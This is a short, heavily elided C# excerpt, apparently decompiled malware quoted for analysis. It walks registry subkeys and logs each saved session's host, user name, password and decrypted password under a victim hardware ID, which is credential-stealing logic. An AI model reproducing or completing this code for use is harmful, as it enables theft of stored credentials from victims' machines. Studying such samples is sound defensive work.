        ...
        foreach (string text in subKeyNames)
        {
            ...
            try
            {
                ...
                foreach (string text2 in subKeyNames2)
                {
                    ...
                    {
                        Log(Connection.Hwid + ": " + String.Format("KEY NAME:" + text2));
                        ...
                        Log(Connection.Hwid + ": " + String.Format("HOST:" + text3));
                        Log(Connection.Hwid + ": " + String.Format("USER:" + text4));
                        Log(Connection.Hwid + ": " + String.Format("PASS:" + text5));
                        Log(Connection.Hwid + ": " + String.Format("Decrypt PASS:" + str));
                        Log(Connection.Hwid + ": " + "=============================================");
                    }
                }
            }
